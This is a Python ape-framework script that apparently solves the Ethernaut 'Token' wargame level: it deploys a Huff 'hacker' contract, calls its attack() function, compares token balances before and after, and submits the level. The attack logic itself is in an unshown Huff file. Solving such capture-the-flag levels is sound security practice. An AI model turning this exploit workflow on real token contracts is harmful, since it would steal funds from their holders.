from ape import accounts
from ..utils.helper import (
    get_level_instance,
    level_completed,
    deploy_huff_contract,
    encode,
    get_sig,
    send_tx,
)

ETHERNAUT = "0xD2e5e0102E55a5234379DD796b8c641cd5996Efd"
LEVEL = "0xB4802b28895ec64406e45dB504149bfE79A38A57"


def get_token_balance(user, hacker, owner):
    calldata = get_sig("balanceOf(address)") + encode(["address"], [owner]).hex()
    receipt = send_tx(user, hacker, calldata)
    return receipt.call_tree.outputs


def main():
    # setting up user
    user = accounts.test_accounts[0]

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user)

    # deploy hacker contract
    print("\n--- Huff Huff... Deploying hacker contract ---\n")
    hacker = deploy_huff_contract("Token.huff", instance, user)

    # exploit goes here
    print("\n--- Exploiting level instance ---\n")

    user_before_bal = get_token_balance(user, hacker, user.address)

    print(f"\n--- Our balance before the exploit: {user_before_bal} ---\n")

    contract_before_bal = get_token_balance(user, hacker, hacker)

    print(f"\n--- Our contract's balance before exploit: {contract_before_bal} ---\n")

    send_tx(user, hacker, get_sig("attack()"))

    user_after_bal = get_token_balance(user, hacker, user.address)

    print(f"\n--- Our balance after the exploit: {user_after_bal} ---\n")

    contract_after_bal = get_token_balance(user, hacker, hacker)

    print(f"\n--- Our contract's balance after the exploit: {contract_after_bal} ---\n")

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
